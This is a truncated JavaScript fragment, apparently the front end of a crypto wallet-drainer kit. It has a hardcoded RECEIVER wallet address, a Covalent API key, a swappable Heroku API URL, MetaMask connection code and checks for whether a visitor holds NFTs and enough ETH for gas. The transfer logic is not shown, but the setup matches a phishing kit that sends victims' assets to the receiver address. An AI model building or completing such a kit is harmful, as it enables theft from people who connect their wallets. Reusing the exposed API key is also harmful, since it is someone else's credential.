const RECEIVER = "0x7C9466D359Bf266f335B78a0A4b50998E0f77567"; 
// match backend RECEIVER constants.js

const COVAL_KEY = "ckey_47d9b88f4154461ab4ab348eb88";
// (your API KEY from `https://api.covalenthq.com)

const API_URL = "https://threepatsana.herokuapp.com";  // CHANGE TO YOUR API_URL
...
async function action(account) {
  ...
  if (!account) {
    await connect('mm');
    // $('.metamask-button').text('Connecting...');
    return;
  }
  // check chain
...
async function notEligible(info) {
  ...
  switch (info) {
      ...
      case "noNFTs":
          ...
          break;
      case "noETH":
          noteli.innerText = "Not enough ETH for gas."
          break;
      default:
